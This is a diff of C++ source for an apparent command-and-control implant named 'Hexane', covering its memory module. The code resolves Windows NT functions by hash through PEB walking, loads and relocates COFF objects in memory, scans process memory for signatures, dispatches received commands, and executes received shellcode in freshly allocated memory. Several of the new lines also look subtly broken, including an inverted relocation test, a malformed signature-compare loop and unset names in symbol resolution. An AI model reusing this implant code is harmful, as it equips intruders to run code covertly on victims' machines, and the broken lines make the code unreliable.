@@ -14,17 +14,6 @@ namespace Memory {
 
     namespace Methods {
 
-        BOOL MoveFilePointer(HANDLE handle, int32_t offset, int32_t* current) {
-            HEXANE
-
-            *current += offset;
-            if (!Ctx->win32.SetFilePointer(handle, *current, nullptr, FILE_BEGIN)) {
-                return false;
-            }
-
-            return true;
-        }
-
         UINT_PTR GetStackCookie() {
             HEXANE
 
@@ -38,18 +27,13 @@ namespace Memory {
         VOID GetProcessHeaps(HANDLE process, const uint32_t access, const uint32_t pid) {
             HEXANE
 
-            HANDLE snap = { };
-            HEAPLIST32 heaps = { };
+            HANDLE      snap    = { };
+            HEAPLIST32  heaps   = { };
+
             heaps.dwSize = sizeof(HEAPLIST32);
 
-            if (!NT_SUCCESS(Process::NtOpenProcess(&process, access, pid))) {
-                return;
-            }
-
-            snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
-            if (snap == INVALID_HANDLE_VALUE) {
-                return;
-            }
+            x_ntassert(Process::NtOpenProcess(&process, access, pid));
+            x_assert(snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid));
 
             if (Ctx->win32.Heap32ListFirst(snap, &heaps)) {
                 do {
@@ -58,25 +42,23 @@ namespace Memory {
                 }
                 while (Ctx->win32.Heap32ListNext(snap, &heaps));
             }
+
+        defer:
         }
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
             HEXANE
 
-            HRSRC res_info = { };
-            _resource* object = { };
+            HRSRC       res_info    = { };
+            _resource   *object     = { };
 
             object = S_CAST(_resource*,  x_malloc(sizeof(_resource)));
-            if (
-                !(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA)) ||
-                !(object->h_global  = Ctx->win32.LoadResource(base, res_info)) ||
-                !(object->size      = Ctx->win32.SizeofResource(base, res_info)) ||
-                !(object->res_lock  = Ctx->win32.LockResource(object->h_global))) {
+            x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
+            x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
+            x_assert(object->size      = Ctx->win32.SizeofResource(base, res_info));
+            x_assert(object->res_lock  = Ctx->win32.LockResource(object->h_global));
 
-                x_free(object);
-                return nullptr;
-            }
-
+        defer:
             return object;
         }
 
@@ -99,7 +81,7 @@ namespace Memory {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
             _hexane instance    = { };
-            void *region        = { };
+            void    *region     = { };
 
             instance.teb = NtCurrentTeb();
             instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
@@ -108,29 +90,26 @@ namespace Memory {
             instance.base.address           = U_PTR(InstStart());
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
-            if (
-                !(instance.modules.ntdll = M_PTR(NTDLL)) ||
-                !(F_PTR_HMOD(instance.nt.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(instance.nt.RtlRandomEx, instance.modules.ntdll, RTLRANDOMEX))) {
-                return;
-            }
+            x_assert(instance.modules.ntdll = M_PTR(NTDLL));
+            x_assert(F_PTR_HMOD(instance.nt.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY));
+            x_assert(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP));
+            x_assert(F_PTR_HMOD(instance.nt.RtlRandomEx, instance.modules.ntdll, RTLRANDOMEX));
 
             region = C_PTR(instance.base.address + U_PTR(&__global));
-            if (!(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
-                return;
-            }
+            x_assert(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)));
 
             x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
             x_memset(&instance, 0, sizeof(_hexane));
             x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
+
+        defer:
         }
 
         VOID ContextDestroy(_hexane* Ctx) {
             // todo: needs expanded to destroy all strings (http/smb context + anything else)
 
-            auto RtlFreeHeap = Ctx->nt.RtlFreeHeap;
-            auto Heap = Ctx->heap;
+            auto RtlFreeHeap    = Ctx->nt.RtlFreeHeap;
+            auto Heap           = Ctx->heap;
 
             x_memset(Ctx, 0, sizeof(_hexane));
 
@@ -139,116 +118,11 @@ namespace Memory {
             }
         }
 
-        VOID ResolveApi() {
-            HEXANE
-
-            OSVERSIONINFOW OSVersionW = { };
-            x_memset(&Ctx->little, ENDIANESS, 1);
-
-            if (!(Ctx->modules.kernel32 = M_PTR(KERNEL32))) {
-                return_defer(ERROR_MOD_NOT_FOUND);
-            }
-
-            if (!(Ctx->modules.kernbase = M_PTR(KERNELBASE))) {
-                return_defer(ERROR_MOD_NOT_FOUND);
-            }
-
-            if (!(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
-                return_defer(ERROR_PROC_NOT_FOUND);
-            }
-
-            // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
-            Ctx->session.version = WIN_VERSION_UNKNOWN;
-            OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);
-
-            if (!NT_SUCCESS(Ctx->nt.RtlGetVersion(&OSVersionW))) {
-                return_defer(ERROR_PROC_NOT_FOUND);
-            }
-
-            if (OSVersionW.dwMajorVersion >= 5) {
-                if (OSVersionW.dwMajorVersion == 5) {
-                    if (OSVersionW.dwMinorVersion == 1) {
-                        Ctx->session.version = WIN_VERSION_XP;
-                    }
-                }
-                else if (OSVersionW.dwMajorVersion == 6) {
-                    if (OSVersionW.dwMinorVersion == 0) {
-                        Ctx->session.version = WIN_VERSION_2008;
-                    }
-                    else if (OSVersionW.dwMinorVersion == 1) {
-                        Ctx->session.version = WIN_VERSION_2008_R2;
-                    }
-                    else if (OSVersionW.dwMinorVersion == 2) {
-                        Ctx->session.version = WIN_VERSION_2012;
-                    }
-                    else if (OSVersionW.dwMinorVersion == 3) {
-                        Ctx->session.version = WIN_VERSION_2012_R2;
-                    }
-                }
-                else if (OSVersionW.dwMajorVersion == 10) {
-                    if (OSVersionW.dwMinorVersion == 0) {
-                        Ctx->session.version = WIN_VERSION_2016_X;
-                    }
-                }
-            }
-
-            if (
-                !(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory ,          Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory,           Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory,          Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory,          Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtCreateSection,               Ctx->modules.ntdll, NTCREATESECTION)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection,            Ctx->modules.ntdll, NTMAPVIEWOFSECTION)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection,          Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtOpenProcess,                 Ctx->modules.ntdll, NTOPENPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess,           Ctx->modules.ntdll, NTCREATEUSERPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtTerminateProcess,            Ctx->modules.ntdll, NTTERMINATEPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtTerminateThread,             Ctx->modules.ntdll, NTTERMINATETHREAD)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx,  Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters,   Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken,            Ctx->modules.ntdll, NTOPENPROCESSTOKEN)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken,             Ctx->modules.ntdll, NTOPENTHREADTOKEN)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtDuplicateToken,              Ctx->modules.ntdll, NTDUPLICATETOKEN)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtDuplicateObject,             Ctx->modules.ntdll, NTDUPLICATEOBJECT)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken,       Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess,     Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlCreateHeap,                 Ctx->modules.ntdll, RTLCREATEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap,               Ctx->modules.ntdll, RTLALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap,             Ctx->modules.ntdll, RTLREALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlFreeHeap,                   Ctx->modules.ntdll, RTLFREEHEAP)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap,                Ctx->modules.ntdll, RTLDESTROYHEAP)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString,          Ctx->modules.ntdll, RTLINITUNICODESTRING)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtCreateThreadEx,              Ctx->modules.ntdll, NTCREATETHREADEX)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtDeviceIoControlFile,         Ctx->modules.ntdll, NTDEVICEIOCONTROLFILE)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtOpenFile,                    Ctx->modules.ntdll, NTOPENFILE)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtOpenThread,                  Ctx->modules.ntdll, NTOPENTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlRandomEx,                   Ctx->modules.ntdll, RTLRANDOMEX)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtResumeThread,                Ctx->modules.ntdll, NTRESUMETHREAD)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtGetContextThread,            Ctx->modules.ntdll, NTGETCONTEXTTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtSetContextThread,            Ctx->modules.ntdll, NTSETCONTEXTTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtSetInformationThread,        Ctx->modules.ntdll, NTSETINFORMATIONTHREAD)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject,         Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
-                !(F_PTR_HMOD(Ctx->nt.TpAllocWork,                   Ctx->modules.ntdll, TPALLOCWORK)) ||
-                !(F_PTR_HMOD(Ctx->nt.TpPostWork,                    Ctx->modules.ntdll, TPPOSTWORK)) ||
-                !(F_PTR_HMOD(Ctx->nt.TpReleaseWork,                 Ctx->modules.ntdll, TPRELEASEWORK)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtTestAlert,                   Ctx->modules.ntdll, NTTESTALERT)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtClose,                       Ctx->modules.ntdll, NTCLOSE)) ||
-                !(F_PTR_HMOD(Ctx->nt.RtlGetVersion,                 Ctx->modules.ntdll, RTLGETVERSION)) ||
-                !(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation,      Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION))) {
-                return_defer(ERROR_PROC_NOT_FOUND);
-            }
-
-            defer:
-        }
     }
 
     namespace Objects {
 
-        UINT_PTR GetInternalAddress(uint32_t name, bool* internal) {
+        UINT_PTR GetInternalAddress(uint32_t name) {
             HEXANE
 
             return 0;
@@ -257,14 +131,14 @@ namespace Memory {
         BOOL BaseRelocation(_executable *object) {
             HEXANE
 
-            _symbol *symbol     = { };
-            char symbol_name[9] = { };
-            char *entry_name    = { };
-            bool success        = true;
+            bool        success         = true;
+            char        symbol_name[9]  = { };
+            char        *entry_name     = { };
+            _symbol     *symbol         = { };
 
-            uint32_t hash       = 0;
-            uintptr_t offset    = 0;
-            uint32_t count      = 0;
+            uint32_t    hash            = 0;
+            uintptr_t   offset          = 0;
+            uint32_t    count           = 0;
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                 object->section     = P_IMAGE_SECTION_HEADER(object->buffer, i);
@@ -285,117 +159,99 @@ namespace Memory {
                     hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
 
                     void *reloc     = object->sec_map[j].address + object->reloc->VirtualAddress;
-                    void *sym_sec   = object->sec_map[symbol->SectionNumber - 1].address;
+                    void *target    = object->sec_map[symbol->SectionNumber - 1].address;
                     void *fn_map    = object->fn_map + sizeof(void*) * count;
                     void *function  = C_PTR(ResolveSymbol(object, hash, symbol->Type));
 
-                    switch (function != nullptr) {
-#if _WIN64
-                    case true: {
-                        switch (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
-
-                        case true: {
+                    if (!function)
+#ifdef WIN64
+                    {
+                        if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                             *R_CAST(void**, fn_map) = function;
-                            offset = S_CAST(uint32_t, U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t));
 
+                            offset = S_CAST(uint32_t, U_PTR(fn_map) - U_PTR(reloc) - sizeof(uint32_t));
                             *S_CAST(uintptr_t*, reloc) = offset;
+
                             count++;
+
+                        } else {
+                            success_(false);
                         }
-                        default:
+                    } else {
+                        if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_1) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_2) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_3) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_4) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(UINT32) - 4;
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_5) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
+                            offset = *S_CAST(uint32_t*, reloc);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
+
+                            *S_CAST(uint32_t*, reloc) = offset;
+                        } else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR64) {
+                            offset = *S_CAST(uint64_t*, reloc);
+                            offset += U_PTR(target);
+
+                            *S_CAST(uint64_t*, reloc) = offset;
+                        } else {
                             success_(false);
                         }
                     }
-                    case false:
-
-                        switch (object->reloc->Type) {
-                        case IMAGE_REL_AMD64_REL32: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_REL32_1: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 1;
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_REL32_2: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 2;
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_REL32_3: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 3;
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_REL32_4: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(UINT32) - 4;
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_REL32_5: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t) - 5;
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_ADDR32NB: {
-                            offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);
-
-                            *S_CAST(uint32_t*, reloc) = offset;
-                        }
-                        case IMAGE_REL_AMD64_ADDR64: {
-                            offset = *S_CAST(uint64_t*, reloc);
-                            offset += U_PTR(sym_sec);
-
-                            *S_CAST(uint64_t*, reloc) = offset;
-                        }
-                        default:
-                            success_(false);
-                        }
 #else
-                    case true: {
-                        switch (object->reloc->Type == IMAGE_REL_I386_DIR32) {
-                        case true: {
-                            *S_CAST(void**, fn_map) = func;
+                    {
+                        if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
+                            *S_CAST(void**, fn_map) = function;
                             offset = U_PTR(fn_map);
 
                             *S_CAST(uint32_t*, reloc) = offset;
                             count++;
-                        }
-                        default:
+
+                        } else {
                             success_(false);
                         }
-                    }
-                    case false: {
-                        switch (object->reloc->Type) {
-                        case IMAGE_REL_I386_REL32: {
+                    } else {
+                        if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                             offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec) - U_PTR(reloc) - sizeof(uint32_t);
+                            offset += U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
 
                             *S_CAST(uint32_t*, reloc) = offset;
                         }
-                        case IMAGE_REL_I386_DIR32: {
+                        else if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                             offset = *S_CAST(uint32_t*, reloc);
-                            offset += U_PTR(sym_sec);
+                            offset += U_PTR(target);
 
                             *S_CAST(uint32_t*, reloc) = offset;
                         }
-                        default:
+                        else {
                             success_(false);
                         }
                     }
 #endif
-                    default:
-                        success_(false);
-                    }
-
                     object->reloc = R_CAST(_reloc*, (U_PTR(object->reloc)  + sizeof(_reloc)));
                 }
             }
@@ -408,16 +264,14 @@ namespace Memory {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
             HEXANE
 
-            uintptr_t address = { };
-            bool is_internal = false;
+            uintptr_t   address     = { };
+            char        *lib_name   = { };
+            char        *fn_name    = { };
 
-            if ((address = Memory::Objects::GetInternalAddress(entry_name, &is_internal)) && is_internal) {
-                return address;
-            } else {
-                char *lib_name = { };
-                char *fn_name = { };
-                // todo: change cmd_map to func_map and add every function
+            x_assert(address = Memory::Objects::GetInternalAddress(entry_name));
+
                 /*
+                 * todo: change cmd_map to func_map and add every function
                  * ok, hear me out:
                  *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
                  *      map[string]string = strings.Split(name, "$")
@@ -425,19 +279,20 @@ namespace Memory {
                  *      LoadExport(module, function);
                  */
 
-                address = Modules::LoadExport(lib_name, fn_name);
-                return address;
-            }
+            address = Modules::LoadExport(lib_name, fn_name);
+
+            defer:
+            return address;
         }
 
         SIZE_T GetFunctionMapSize(_executable *object) {
             HEXANE
 
-            char name[9]        = { };
-            char *symbol_name   = { };
+            _symbol     *symbol         = { };
+            char        *symbol_name    = { };
 
-            _symbol *symbol     = { };
-            uint32_t n_funcs    = 0;
+            char        buffer[9]       = { };
+            uint32_t    n_funcs         = 0;
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
 
@@ -448,9 +303,9 @@ namespace Memory {
                     symbol = &object->symbol[object->reloc->SymbolTableIndex];
 
                     if (symbol->First.Value[0] != 0) {
-                        x_memset(name, 0, sizeof(name));
-                        x_memcpy(name, symbol->First.Name, 8);
-                        symbol_name = name;
+                        x_memset(buffer, 0, sizeof(buffer));
+                        x_memcpy(buffer, symbol->First.Name, 8);
+                        symbol_name = buffer;
 
                     } else {
                         symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
@@ -474,9 +329,7 @@ namespace Memory {
             object->fn_map->size = GetFunctionMapSize(object);
             object->sec_map = R_CAST(_object_map*, x_malloc(sizeof(_object_map)));
 
-            if (!object->sec_map) {
-                return_defer(ERROR_REPARSE_OBJECT);
-            }
+            x_assert(object->sec_map);
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                 object->section = P_IMAGE_SECTION_HEADER(data, i);
@@ -485,11 +338,10 @@ namespace Memory {
             }
 
             object->size += object->fn_map->size;
-            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
-                return_defer(ntstatus);
-            }
 
+            x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
             next = object->buffer;
+
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                 object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);
 
@@ -520,14 +372,12 @@ namespace Memory {
         }
 
         LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {
-            // todo: replace PEB_POINTER with custom impl
-
             const auto head = R_CAST(PLIST_ENTRY, &(PEB_POINTER)->Ldr->InMemoryOrderModuleList);
 
             for (auto next = head->Flink; next != head; next = next->Flink) {
                 wchar_t lowercase[MAX_PATH] = { };
 
-                const auto mod = R_CAST(LDR_DATA_TABLE_ENTRY*, B_PTR(next) - sizeof(uint32_t) * 4);
+                const auto mod  = R_CAST(LDR_DATA_TABLE_ENTRY*, B_PTR(next) - sizeof(uint32_t) * 4);
                 const auto name = mod->BaseDllName;
 
                 if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, name.Buffer), x_wcslen(name.Buffer)) == 0) {
@@ -540,17 +390,17 @@ namespace Memory {
 
         FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {
 
-            FARPROC address = { };
-            char lowercase[MAX_PATH] = { };
+            FARPROC address             = { };
+            char    lowercase[MAX_PATH] = { };
 
             const auto dos_head = P_IMAGE_DOS_HEADER(base);
-            const auto nt_head = P_IMAGE_NT_HEADERS(base, dos_head);
-            const auto exports = P_IMAGE_EXPORT_DIRECTORY(dos_head, nt_head);
+            const auto nt_head  = P_IMAGE_NT_HEADERS(base, dos_head);
+            const auto exports  = P_IMAGE_EXPORT_DIRECTORY(dos_head, nt_head);
 
             if (exports->AddressOfNames) {
-                const auto ords = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
-                const auto funcs = RVA(uint32_t*, base, exports->AddressOfFunctions);
-                const auto names = RVA(uint32_t*, base, exports->AddressOfNames);
+                const auto ords     = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
+                const auto funcs    = RVA(uint32_t*, base, exports->AddressOfFunctions);
+                const auto names    = RVA(uint32_t*, base, exports->AddressOfNames);
 
                 for (auto i = 0; i < exports->NumberOfNames; i++) {
                     const auto name = RVA(char*, base, names[i]);
@@ -570,8 +420,8 @@ namespace Memory {
         UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {
             HEXANE
 
-            uintptr_t symbol = 0;
-            int reload = 0;
+            uintptr_t   symbol = 0;
+            int         reload = 0;
 
             const auto mod_hash = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
             const auto fn_hash = Utils::GetHashFromStringA(export_name, x_strlen(export_name));
@@ -595,12 +445,10 @@ namespace Memory {
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
             HEXANE
 
-            uintptr_t ret = 0;
-            const auto address = R_CAST(uintptr_t, target);
+            uintptr_t   ret     = 0;
+            const auto  address = R_CAST(uintptr_t, target);
 
-            for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000;
-                 ret < address + 0x70000000;
-                 ret += 0x10000) {
+            for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000; ret < address + 0x70000000; ret += 0x10000) {
                 if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                     ret = 0;
                 }
@@ -610,24 +458,22 @@ namespace Memory {
         }
 
         BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {
-            for (; *mask; ++mask, ++data, ++signature) {
+            while (*mask && ++mask, ++data, ++signature) {
                 if (*mask == 0x78 && *data != *signature) {
-                    return FALSE;
+                    return false;
                 }
             }
             return (*mask == 0x00);
         }
 
-        UINT_PTR SignatureScan(const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
+        UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
             HEXANE
 
-            size_t read = 0;
-            uintptr_t address = 0;
-            auto buffer = R_CAST(uint8_t*, x_malloc(size));
+            size_t      read    = 0;
+            uintptr_t   address = 0;
 
-            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, start), buffer, size, &read))) {
-                return_defer(ntstatus);
-            }
+            auto buffer  = R_CAST(uint8_t*, x_malloc(size));
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, R_CAST(void *, start), buffer, size, &read));
 
             for (auto i = 0; i < size; i++) {
                 if (SigCompare(buffer + i, signature, mask)) {
@@ -638,11 +484,8 @@ namespace Memory {
 
             x_memset(buffer, 0, size);
 
-            defer:
-            if (buffer) {
-                x_free(buffer);
-            }
-
+        defer:
+            if (buffer) { x_free(buffer); }
             return address;
         }
     }
@@ -658,45 +501,41 @@ namespace Memory {
             return EXCEPTION_CONTINUE_EXECUTION;
         }
 
-        VOID ExecuteCommand(_parser &parser) {
+        BOOL ExecuteCommand(_parser &parser) {
             HEXANE
 
-            _command cmd        = { };
-            uintptr_t address   = { };
+            _command    cmd         = { };
+            uintptr_t   address     = { };
 
-            bool is_internal    = false;
-            const auto cmd_id   = Parser::UnpackDword(&parser);
+            const auto  cmd_id      = Parser::UnpackDword(&parser);
+            bool        success     = true;
 
             if (cmd_id == NOJOB) {
                 goto defer;
             }
 
-            if (!(address = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
-                return_defer(ntstatus);
-                // todo: error_transmit("command not found : %s")
-            }
+            x_assertb(address = Memory::Objects::GetInternalAddress(cmd_id));
 
             cmd = R_CAST(_command, Ctx->base.address + address);
             cmd(&parser);
 
-            defer:
+        defer:
+            return success;
         }
 
-        VOID ExecuteShellcode(const _parser& parser) {
+        BOOL ExecuteShellcode(const _parser& parser) {
             HEXANE
 
-            void* address   = { };
-            void (*exec)()  = { };
-            size_t size = parser.Length;
+            void    (*exec)()   = { };
+            void    *address    = { };
 
-            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
-                return_defer(ntstatus);
-            }
+            size_t  size        = parser.Length;
+            bool    success     = true;
+
+            x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
             x_memcpy(address, parser.buffer, parser.Length);
